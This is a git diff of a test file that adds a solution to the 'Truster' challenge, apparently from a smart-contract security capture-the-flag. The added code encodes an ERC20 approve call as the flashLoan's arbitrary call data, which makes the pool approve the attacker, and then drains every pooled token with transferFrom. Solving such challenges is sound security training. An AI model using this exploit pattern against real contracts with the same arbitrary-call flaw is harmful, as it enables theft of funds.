@@ -28,6 +28,33 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
+        /**
+         * @dev
+         * The flaw here resides in the flashLoan() function allowing us to do any function call(data parameter) to any address we want (the target parameter).
+         * We can encode the ERC20 approve function, with the attacker address and the pool tokens balance as arguments: this will be our "data" argument.
+         * Then, by passing the ERC20 DVT token address as the "target" argument, we essentially make the pool contract approve our attacker to withdraw all the tokens in the pool.
+         * After calling flashLoan(), we can check that our attacker is approved to withdraw the tokens pool balance, and call transferFrom() to complete the attack.
+         */
+        const interface = new ethers.utils.Interface([ "function approve(address spender, uint256 amount)" ])
+
+        const data = interface.encodeFunctionData('approve', [
+          attacker.address,
+          TOKENS_IN_POOL
+        ]);
+        console.log(`\u001b[1;35mStarting the attack`);
+        await this.pool.flashLoan(0, attacker.address, this.token.address, data);
+
+        const allowance = await this.token.allowance(this.pool.address, attacker.address);
+        console.log(
+          `\u001b[1;36mThe allowance of the attacker is now ${Math.trunc(
+            ethers.utils.formatEther(allowance)
+          )} DVT`
+        );
+        await this.token.connect(attacker).transferFrom(
+          this.pool.address,
+          attacker.address,
+          TOKENS_IN_POOL
+        );
         /** CODE YOUR EXPLOIT HERE  */
     });
 
